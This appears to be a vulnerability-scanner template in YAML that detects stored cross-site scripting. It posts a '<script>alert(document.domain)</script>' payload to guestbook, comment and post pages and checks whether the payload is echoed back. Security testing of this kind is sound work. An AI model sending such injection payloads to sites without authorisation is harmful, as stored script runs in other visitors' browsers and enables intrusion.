id: xss-stored

info:
  name: Cross-Site Scripting (XSS) - Stored
  author: Kalkaneus Team
  severity: high
  description: Detects stored XSS vulnerabilities
  reference:
    - https://owasp.org/www-community/attacks/xss/
  tags: xss,stored,persistent,injection

http:
  - method: POST
    path:
      - "{{BaseURL}}/guestbook.php"
      - "{{BaseURL}}/comment.php"
      - "{{BaseURL}}/post.php"
    
    headers:
      Content-Type: application/x-www-form-urlencoded
    
    body: |
      name=<script>alert(document.domain)</script>&comment=test&submit=Submit
    
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(document.domain)</script>"
        
      - type: status
        status:
          - 200
